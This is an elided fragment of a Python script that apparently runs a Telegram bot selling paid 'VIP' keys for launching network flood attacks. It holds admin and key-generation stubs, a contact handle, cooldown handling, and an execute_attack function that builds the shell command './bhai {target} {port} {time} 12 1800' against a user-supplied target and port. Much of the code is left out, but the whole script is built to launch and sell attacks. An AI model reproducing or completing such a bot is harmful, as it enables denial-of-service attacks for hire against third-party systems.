...
# Admin user IDs
admin_id = {"7214759684"}  # Replace with actual admin ID
...
def generate_key(length=10):
    ...
    return f"BUGGI-VIP-{key.upper()}"  # Ensure key is in uppercase
...
def generate_key_command(message):
    ...
    if user_id in admin_id:
        ...
        response = "𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗔𝗱𝗺𝗶𝗻 @buggi_2"
...
def execute_attack(user_id, target, port, time):
    ...
    try:
        ...
        full_command = f"./bhai {target} {port} {time} 12 1800"  # Replace with actual attack command
...
def handle_attack(message):
    user_id = str(message.chat.id)
    cooldown_time = 200  # Cooldown in seconds (e.g., 60 seconds)
...
if __name__ == "__main__":
    ...
    while True:
        try:
            ...
            print(e)
            time.sleep(5)  # Small delay to avoid rapid looping in case of persistent errors